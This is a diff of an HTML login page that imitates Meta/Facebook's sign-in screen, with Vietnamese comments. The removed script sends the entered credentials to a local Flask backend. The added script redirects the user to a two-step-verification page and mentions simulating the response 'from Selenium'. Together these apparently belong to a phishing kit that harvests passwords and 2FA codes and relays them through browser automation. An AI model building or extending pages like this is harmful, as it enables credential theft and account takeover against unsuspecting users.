@@ -59,27 +59,20 @@
             <button class="btn rounded-full mr-3 ml-3 py-2 bg-[#0064E0] text-white hover:bg-blue-700 hover:mr-4 hover:ml-4 cursor-pointer" type="submit">Log in</button>
             <p class="mt-2 text-gray-800 bg-none text-sm font-semibold mx-auto mb-20 hover:underline cursor-pointer">Forgotten Password?</p>
         </form>
-<script>
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault(); // Ngăn chặn hành vi mặc định của form
-
-    const formData = new FormData(this);
-    fetch('http://localhost:5000/login', { // Địa chỉ IP hoặc tên miền của Flask
-        method: 'POST',
-        body: formData
-    })
-    .then(response => {
-        if (response.ok) {
-            // Xử lý thành công
-            window.location.href = '/two_step_verification'; // Chuyển hướng nếu cần
-        } else {
-            // Xử lý lỗi
-            alert('Login failed');
-        }
-    })
-    .catch(error => console.error('Error:', error));
-});
-</script>
+        <script>
+            document.getElementById('login-button').addEventListener('click', function() {
+                // Giả lập quá trình đăng nhập và phản hồi từ Selenium
+                const loginSuccess = true; // Thay đổi giá trị này để kiểm tra
+    
+                if (loginSuccess) {
+                    // Chuyển hướng đến two_step_verification.html
+                    window.location.href = 'two_step_verification.html';
+                } else {
+                    // Chuyển hướng đến loginfail.html
+                    window.location.href = 'loginfail.html';
+                }
+            });
+        </script>
         <div class="bottom bg-none flex flex-col">
             <button class="btn border border-blue-900 rounded-full mr-3 ml-3 py-2 text-blue-900 font-semibold hover:border-blue-600 hover:text-blue-600 hover:mr-4 hover:ml-4">Create new account</button>
             <img class="w-12 mx-auto bg-transparent" src="meta.svg" alt="">
